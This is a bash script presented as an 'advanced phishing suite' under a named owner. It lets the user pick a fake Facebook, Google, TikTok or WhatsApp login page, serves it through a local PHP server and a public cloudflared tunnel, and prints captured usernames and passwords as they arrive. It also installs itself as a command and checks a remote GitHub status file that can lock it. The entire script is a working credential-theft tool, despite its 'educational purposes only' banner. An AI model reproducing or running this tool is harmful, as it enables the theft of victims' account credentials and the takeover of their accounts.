#!/bin/bash

# --- AUTO-SETUP ---
if [[ ! -f $PREFIX/bin/hunter ]]; then
    cp $0 $PREFIX/bin/hunter
    chmod +x $PREFIX/bin/hunter
fi

# --- REMOTE CONTROL & LARGE ACCESS DENIED ---
STATUS=$(curl -s -L https://raw.githubusercontent.com/hunteroxe1-ai/PEkha/main/status.txt | tr -d '[:space:]')

if [[ "$STATUS" == "OFF" ]]; then
    clear
    echo -e "\e[1;31m"
    echo "  ###########################################################"
    echo "  #                                                         #"
    echo "  #    █████╗  ██████╗ ██████╗███████╗███████╗███████╗      #"
    echo "  #   ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝      #"
    echo "  #   ███████║██║     ██║     █████╗  ███████╗███████╗      #"
    echo "  #   ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║      #"
    echo "  #   ██║  ██║╚██████╗╚██████╗███████╗███████║███████║      #"
    echo "  #   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝      #"
    echo "  #                                                         #"
    echo "  #    ██████╗ ███████╗███╗   ██╗██╗███████╗██████╗         #"
    echo "  #    ██╔══██╗██╔════╝████╗  ██║██║██╔════╝██╔══██╗        #"
    echo "  #    ██║  ██║█████╗  ██╔██╗ ██║██║█████╗  ██║  ██║        #"
    echo "  #    ██║  ██║██╔══╝  ██║╚██╗██║██║██╔══╝  ██║  ██║        #"
    echo "  #    ██████╔╝███████╗██║ ╚████║██║███████╗██████╔╝        #"
    echo "  #    ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚══════╝╚═════╝         #"
    echo "  #                                                         #"
    echo "  #            THIS TOOL IS LOCKED BY OWNER                 #"
    echo "  #             CONTACT: PHILLIMON ISAAC                    #"
    echo "  #                                                         #"
    echo "  ###########################################################"
    echo -e "\e[0m"
    exit
fi

# --- BANNER ---
clear
echo -e "\e[1;32m   _  _ _  _ _  _ ___ ____ ____    ____ _  _ ____ "
echo -e "\e[1;32m   |__| |  | |\ |  |  |___ |__/    |  |  \/  |___ "
echo -e "\e[1;32m   |  | |__| | \|  |  |___ |  \    |__| _/\_ |___  v/5.5"
echo -e "\e[1;37m  --------------------------------------------------"
echo -e "\e[1;35m  [*] OWNER    : PHILLIMON ISAAC"
echo -e "\e[1;35m  [*] TOOL TYPE: ADVANCED PHISHING SUITE"
echo -e "\e[1;35m  [*] WARNING  : FOR EDUCATIONAL PURPOSES ONLY ⚠️"
echo -e "\e[1;37m  --------------------------------------------------"
echo -e "\e[1;32m  [1] FACEBOOK LOGIN (CLASSIC)"
echo -e "\e[1;32m  [2] FACEBOOK FOLLOWERS BOOSTER"
echo -e "\e[1;32m  [3] GOOGLE LOGIN (OAUTH SYNC)"
echo -e "\e[1;32m  [4] TIKTOK FOLLOWER BOOSTER"
echo -e "\e[1;32m  [5] WHATSAPP VERIFICATION"
echo -e "\e[1;37m  --------------------------------------------------"
echo -e "\e[1;33m  [L] VIEW LOGS  [X] EXIT"
echo -e "\e[1;37m  --------------------------------------------------"
read -p "[?] CHOICE : " choice

case $choice in
    1) cp web/classic.html web/index.html ;;
    2) cp web/fb_boost.html web/index.html ;;
    3) cp web/google.html web/index.html ;;
    4) cp web/tiktok.html web/index.html ;;
    5) cp web/whatsapp.html web/index.html ;;
    L|l) clear; cat storage/passwords.txt; read -p "Enter..."; hunter ;;
    X|x) exit ;;
    *) hunter ;;
esac

echo -e "\e[1;33m\n[!] Generating Target Link...\e[0m"
php -S 127.0.0.1:8080 -t web/ > /dev/null 2>&1 &
sleep 2

echo -ne "\e[1;32m[+] LINK: \e[0m"
cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://[-0-9a-z.]*.trycloudflare.com' &

echo -e "\n\e[1;34m[*] WAITING FOR DATA...\e[0m"
echo -e "\e[1;37m------------------------------------------\e[0m"

# LIVE DATA VIEWER (List Style)
touch storage/passwords.txt
tail -f storage/passwords.txt | while read line; do
    USER=$(echo $line | awk -F'|' '{print $2}' | sed 's/USER://' | tr -d ' ')
    PASS=$(echo $line | awk -F'|' '{print $3}' | sed 's/PASS://' | tr -d ' ')
    
    echo -e "\e[1;32m[!] SUCCESSFUL CAPTURE:\e[0m"
    echo -e "\e[1;37mNumber   :\e[1;33m$USER\e[0m"
    echo -e "\e[1;37mPassword :\e[1;33m$PASS\e[0m"
    echo -e "\e[1;37m------------------------------------------\e[0m"
done
